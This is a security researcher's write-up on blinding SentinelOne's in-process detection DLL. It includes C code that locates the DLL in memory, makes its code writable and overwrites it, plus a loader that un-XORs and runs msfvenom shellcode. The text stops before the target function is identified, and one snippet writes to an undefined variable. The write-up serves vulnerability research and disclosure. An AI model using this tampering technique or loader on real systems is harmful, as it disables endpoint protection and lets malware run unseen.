# SentinelOne Agent Bypass
<hr/>

## What is this?
This is a write-up describing the discovery and exploitation of a vulnerability in Sentinel Agent ("S1"), the in-process monitoring component of the SentinelOne platform.

<br/>
<hr/>

## SentinelOne
SentinelOne is a cybersecurity platform known for its robust Endpoint Detection and Response (EDR) capabilities. It utilizes AI and machine learning to deliver real-time threat detection, automated response, and full visibility into endpoint activities.

SentinelOne is widely adopted across various industries due to its effectiveness in handling sophisticated attacks, ease of deployment, and comprehensive threat intelligence capabilities. Its ability to autonomously detect and respond to threats without manual intervention sets it apart as a leader in the EDR space.

## The Vulnerability
Successful exploitation of the vulnerability blinds the in-process detection, meaning you can run even the most toxic shellcode (e.g., meterpreter) without it getting detected. You can also remotely blind processes and inject into them, also without detection.

<br/>
<hr/>

## In-Process Detection
When the system boots, S1's kernel driver (`SentinelMonitor.sys`) is loaded. This driver calls the `PsSetCreateProcessNotifyRoutine()` Windows API to tell Windows that it wants to be notified every time a new process is created.

Now, whenever a new process is created, the driver is notified, and it has the opportunity to perform some tasks as part of the process creation. One of these tasks is injecting a DLL into the newly created process. This DLL is named `InProcessClient64.dll` on x64 systems and its purpose is to monitor the process for threats. It performs numerous timer- or event-driven tasks such as scanning memory for threats and watching for suspicious memory operations and network connections.

If we use WinDbg to debug notepad.exe, we can see this DLL loaded alongside all the other modules in the process:
```
0:000> lm
start             end                 module name
00007ff6`2e580000 00007ff6`2e5da000   notepad    (deferred)

00007ffe`14a80000 00007ffe`14e96000   InProcessClient64   (deferred)
00007ffe`151e0000 00007ffe`15208000   bcrypt     (deferred)             
00007ffe`15380000 00007ffe`15491000   ucrtbase   (deferred)             
00007ffe`154a0000 00007ffe`1585a000   KERNELBASE   (deferred)             
...snip...
```

We can get some information about the DLL:
```
0:000> lmDvm InProcessClient64
start             end                 module name

## InProcessClient64.dll
Fortunately, developing this exploit did not require a deep understanding of how the DLL works or how it fits into the complex S1 platform, just that certain functions in the DLL are called at certain times, some of which may be responsible for detecting threats. This was enough to give me an idea on how to approach exploiting it - if I could write to the DLL's memory, maybe I could influence its behavior (i.e. disable it).

<br/>
<hr/>

## Locating the Base Address
To be able to write to memory, the first task was to locate the base address of `InProcessClient64.dll`. Due to ASLR, this address will be different on every system, and after every reboot. I created a C++ console app in Visual Studio whose sole purpose (for now) was to attack the `InProcessClient64.dll` that gets injected into it when the process is created.

Using a combination of Windows APIs including `OpenProcess()`, `EnumProcessModules()`, `GetModuleInformation()`, and `GetModuleFileNameExA()`, it is possible to loop through the loaded modules in your process to look for one in particular.

Here is the code that loops through the loaded modules and looks for the one we're interested in. Note that I am not using the DLL's full name, which is probably not necessary, but is less likely to be seen as malicious if S1 happens to be watching for something like this.

```c
    HMODULE hModules[1024];
    DWORD cbNeeded = 0;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());

    if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded))
    {
        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i)
        {
            MODULEINFO modInfo = { 0 };
            if (GetModuleInformation(hProcess, hModules[i], &modInfo, sizeof(MODULEINFO)))
            {
                CHAR modName[MAX_PATH] = { 0 };
                if (GetModuleFileNameExA(hProcess, hModules[i], modName, sizeof(modName) / sizeof(CHAR)))
                {
                    if (std::string(modName).find("cessClient6") != std::string::npos)
                    {
                        // we have found the InProcessClient64.dll module, so now we can grab its base address

                        QWORD base = (QWORD)modInfo.lpBaseOfDll;
                    }
                }
            }
        }
    }
```

## Memory Protections
Now that I had the base address of the DLL, I could try actually writing to its memory. But where? As the write target, I chose `DllMain()`, the default entrypoint for DLLs. To find the location of this function, I used IDA Pro, which showed its offset as `0x32b0`, which means its virtual address is `0x32b0` plus the base address I just obtained. (For some reason IDA Pro is calling this function `DllEntryPoint()`. I don't know what that's about.)

![DllMain](/images/dllmain.png)

But first things first - before I could write memory, I needed to set the memory protection of this address to actually allow writing, since this region is marked as `PAGE_EXECUTE_READ` as can be seen in WinDbg:

![VirtualProtect](/images/vprotect2.png)

To modify memory protection, I used the `VirtualProtect()` Windows API. This function accepts the address whose protection you want to change, how many bytes, the new protection constant, and a place to store the old protection constant which is useful if you want to set it back to its original value when you're done, which I did.

So I modified the PoC to include the following code:

```c
    QWORD base = (QWORD)modInfo.lpBaseOfDll;  // base address of InProcessClient64.dll
    QWORD entrypoint = base + 0x32b0;         // virtual address of the entrypoint (base plus offset)
    DWORD oldProtect = 0;                     // stack variable to receive the previous protection

    printf("Write target: 0x%llx\n", (QWORD)entrypoint);

    if (VirtualProtect((LPVOID)entrypoint, 1, PAGE_READWRITE, &oldProtect))
    {
        printf("Success!\n");
        VirtualProtect((LPVOID)entrypoint, 1, oldProtect, &oldProtect);
    }
```

When I ran the updated PoC in WinDbg, I was able to verify that the protection for the target address had been changed to `PAGE_READWRITE`:

![VirtualProtect](/images/vprotect.png)

With the protection changed, I should now be able to write arbitrary values to the address of the entrypoint. When I did this originally, I fully expected S1 to intervene and kill my process. I don't have a guess as to why S1 allows you to do this.

<br/>
<hr/>

## Writing a Single Byte
At this point I tried writing a single byte to the target address (`DllMain()`). I updated the PoC to add a call to `RtlCopyMemory()` which will copy (write) my `\x90` to the target address. It didn't really matter what byte I chose here, I just needed to prove that I could write at all.

```c
    QWORD base = (QWORD)modInfo.lpBaseOfDll;  // base address of InProcessClient64.dll
    QWORD entrypoint = base + 0x32b0;         // virtual address of the entrypoint (base plus offset)
    DWORD oldProtect = 0;                     // stack variable to receive the previous protection

    printf("Write target: 0x%llx\n", (QWORD)entrypoint);

    if (VirtualProtect((LPVOID)entrypoint, 1, PAGE_READWRITE, &oldProtect))
    {
        printf("Success!\n");
        RtlCopyMemory((LPVOID)addr, "\x90", 1);
        VirtualProtect((LPVOID)entrypoint, 1, oldProtect, &oldProtect);
    }
```

I set a breakpoint right before the call to `RtlCopyMemory()` to examine the memory before writing. This is what the unmodified `DllMain()` looked like:

![before-write](/images/before-write.png)

I then let `RtlCopyMemory()` execute and examined the same address after the write operation:

![after-write](/images/after-write.png)

Success! There is the `nop` (`\x90`) instruction I wrote. I had now confirmed that I could write into `InProcessClient64.dll`'s memory.

<br/>
<hr/>

## Recap
I have the base address of `InProcessClient64.dll`, I've proven that I can call `VirtualProtect()` to set the protection of an address to `PAGE_READWRITE`, and I was able to write to memory with `RtlCopyMemory()`. The next task was to figure out what to write, and where.

<br/>
<hr/>

## RET
Since the goal was to blind S1, my theory was that if I could find the function that is responsible for performing the in-process monitoring, I could write a `ret` (`\xc3`) as its first instruction, which would end execution of the function and return to the address on the top of the stack, never reaching the code that would result in a detection. For example, if we pretend the name of the function was `FindMaliciousThings()`, I wanted it to look like this after I wrote my `ret` instruction:

```c
void FindMaliciousThings()
{
    return;
    ScanMemoryForThreats();
    ScanOtherStuffForThreats();
    FindThreatsAllOverThePlace();
}
```

<br/>
<hr/>

## Function Hunting
Now that I know what I want to write (`ret`), all that was left was finding the function to "patch". The total number of functions in `InProcessClient64.dll` is 7,447, so I had my work cut out for me. I tried a few different ways to automate this task but ended up doing it manually. Notice that IDA does not know the actual names of the functions since there is no debug information available for this DLL. Instead, it refers to functions as `sub_` and then the offset from the base, so `sub_2760` is `0x2760` bytes from the base address of `InProcessClient64.dll`.

![idafunc](/images/idafunc.png)

I used IDA to export the list of all 7,447 functions to a text file, isolated the start address of each function, then split the list into chunks of 100. Instead of programmatically writing a `ret` (since I just proved that I could), I could cheat and use WinDbg's `eb` command (edit byte) to quickly patch a `ret` instruction at each of the 100 functions for this batch of 100. I also switched my test application to one that tries to run the `windows/x64/messagebox` payload since it would certainly get detected as malicious, but should run without detection if I happened to blind the right function.

The full code for the new test application was:
```c
int main(int argc, char* argv[])
{
    // this is the raw payload from msfvenom, but each byte is xor'd with 5 to hide it on disk
    std::string file("c:\\users\\user\\desktop\\msgbox.bin");
    // this function opens the file and xors each byte with 5, restorting it to the original messagebox shellcode
    auto bytes = unxor_file(file, 5);
    auto size = bytes.size();

    PCHAR buf = (PCHAR)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    std::copy(bytes.begin(), bytes.end(), static_cast<char*>(buf));
    std::fill(bytes.begin(), bytes.end(), 0);
    bytes.clear();

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
```

There is nothing clever in this code; in fact, it is purposely not clever, because I am hoping that it will run undetected when the right function is patched with a `ret`.
